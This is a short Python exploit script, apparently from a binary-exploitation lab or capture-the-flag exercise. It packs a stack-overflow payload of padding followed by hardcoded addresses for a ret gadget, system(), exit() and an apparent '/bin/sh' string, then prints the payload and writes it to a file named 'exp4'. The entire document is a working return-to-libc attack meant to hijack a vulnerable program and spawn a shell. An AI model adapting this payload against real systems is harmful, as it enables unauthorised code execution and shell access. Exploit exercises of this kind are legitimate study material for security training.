from struct import pack

p = lambda x: pack("L", x)

padding = b'A' * (16 + 8)
exit_addr = p(0x7ffff7e07590)
shell_addr = p(0x7ffff7f6304f)
system_addr = p(0x7ffff7e15990)
ret_addr = p(0x55555555501a)
payload = padding + ret_addr + system_addr + exit_addr + shell_addr

def exp(fname, s):
    with open(fname, 'wb') as f:
        f.write(s)
    return s

print("payload: padding + ret_addr + system_addr + exit_addr + shell_addr")
print("payload: ", payload)

exp("exp4", payload)

